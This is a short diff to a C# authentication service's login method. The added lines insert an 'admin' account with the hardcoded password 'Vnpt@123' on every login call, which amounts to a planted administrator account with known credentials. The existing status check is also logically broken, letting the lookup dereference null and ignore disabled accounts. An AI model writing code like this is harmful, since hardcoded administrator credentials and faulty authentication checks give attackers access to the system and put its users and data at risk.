@@ -32,6 +32,13 @@ namespace AuthServer.service.impl
         public DataRespond login(User user, string lang)
         {
             DataRespond data = new DataRespond();
+
+            User x = new User();
+            x.username = "admin";
+            x.password = m_hashPass.hashPass("Vnpt@123");
+            //x.status = true;
+            insert(x);
+
             var us = getAll().FirstOrDefault(m=>m.username == user.username);
 
             if (us!= null || us.status == false)
